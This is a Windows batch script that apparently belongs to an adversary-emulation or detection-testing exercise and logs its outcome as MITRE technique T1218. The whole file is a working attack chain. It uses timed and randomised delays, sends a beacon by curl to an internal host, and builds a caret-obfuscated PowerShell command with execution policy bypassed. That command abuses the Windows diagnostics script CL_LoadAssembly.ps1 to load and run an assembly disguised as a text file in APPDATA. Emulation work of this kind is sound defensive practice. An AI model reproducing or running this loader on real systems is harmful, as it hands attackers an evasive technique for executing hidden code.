@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txisnba=%APPDATA%\8777\f3f36ab1
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8777-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=taskmgr.txt
SET dvhhyc=8777
SET logf=%APPDATA%\!rrocubc!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_start>> "!logf!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay1_complete>> "!logf!" 2>nul

curl -k -s -o nul "!keghkgto!"
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_sent>> "!logf!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay2_complete>> "!logf!" 2>nul

SET ^p1=p^o^w^e^r^s^h^e^l^l^.^e^x^e
SET ^c1=^ -^e^p^ b^y^p^a^s^s^ -^c^o^m^m^a^n^d^ ^"
SET ^c2=^s^e^t^-^l^o^c^a^t^i^o^n^ ^-^p^a^t^h^ ^C^:^\^W^i^n^d^o^w^s^^\^d^i^a^g^n^o^s^t^i^c^s^^\^s^y^s^t^e^m^^\^A^u^d^i^o^;^
SET ^c3=^i^m^p^o^r^t^m^o^d^u^l^e^ .^\.^C^L^_^L^o^a^d^A^s^s^e^m^b^l^y^.^p^s^1^;^
SET ^c4=^L^o^a^d^A^s^s^e^m^b^l^y^F^r^o^m^P^a^t^h^ ^'!txisnba!^\!xzanpex!^'^;^[^P^r^o^g^r^a^m^]^:^:^D^a^l^e^(^)^"

echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: command_constructed>> "!logf!" 2>nul
SET /A dly=%RANDOM% %% 20 + 10
timeout /t !dly! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_complete>> "!logf!" 2>nul

CALL !p1!!c1!!c2!!c3!!c4!
IF ERRORLEVEL 1 (
    SET res=0
    SET err=assembly_load_failed
) ELSE (
    SET res=1
    SET err=
)
echo [%DATE% %TIME%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|System_Binary_Proxy_Execution=!res!:!err!>> "!logf!" 2>nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: ttp_logged>> "!logf!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_end>> "!logf!" 2>nul